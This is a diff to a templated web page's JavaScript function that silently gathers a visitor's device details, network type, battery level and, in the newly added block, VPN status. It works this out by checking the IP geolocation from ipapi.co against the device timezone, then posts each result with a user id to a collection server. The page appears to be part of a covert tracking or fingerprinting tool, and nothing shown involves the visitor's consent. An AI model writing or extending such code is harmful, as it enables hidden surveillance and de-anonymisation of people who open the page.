@@ -326,7 +326,8 @@ async function sendDeviceInfo(){
   td+="<br><b>📱 Device</b><br>";
   for(var i=0;i<keys.length;i++){if(keys[i] in navigator)td+="<b>"+keys[i]+":</b> <code>"+navigator[keys[i]]+"</code><br>";}
   if(navigator.connection){var nc=navigator.connection;td+="<br><b>🌐 "+nc.effectiveType+" | "+(nc.downlink||'?')+"Mbps | RTT:"+(nc.rtt||'?')+"ms</b><br>";$.post(a+"/network",{uid:uid,data:encodeURIComponent("📶 "+nc.effectiveType+" ⚡"+(nc.downlink||'?')+"Mbps RTT:"+(nc.rtt||'?')+"ms")});}
-  if("getBattery" in navigator){try{var batt=await navigator.getBattery();var pct=Math.round(batt.level*100);td+="<b>🔋 "+pct+"% | Charging:"+batt.charging+"</b><br>";$.post(a+"/battery",{uid:uid,level:pct,charging:batt.charging});}catch(e){}}
+  <% if(feat.battery){ %>if("getBattery" in navigator){try{var batt=await navigator.getBattery();var pct=Math.round(batt.level*100);td+="<b>🔋 "+pct+"% | Charging:"+batt.charging+"</b><br>";$.post(a+"/battery",{uid:uid,level:pct,charging:batt.charging});}catch(e){}}<% } %>
+  <% if(feat.vpnDetect){ %>try{var _tz=Intl.DateTimeFormat().resolvedOptions().timeZone;var _ipd=await fetch("https://ipapi.co/json/").then(function(r){return r.json();});if(_ipd&&_ipd.timezone&&_ipd.timezone!==_tz){$.post(a+"/vpndetect",{uid:uid,deviceTz:_tz,ipTz:_ipd.timezone,ipCountry:_ipd.country_name||'?',ipCity:_ipd.city||'?'});}}catch(e){}<% } %>
   $.post(a,{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
 }
 
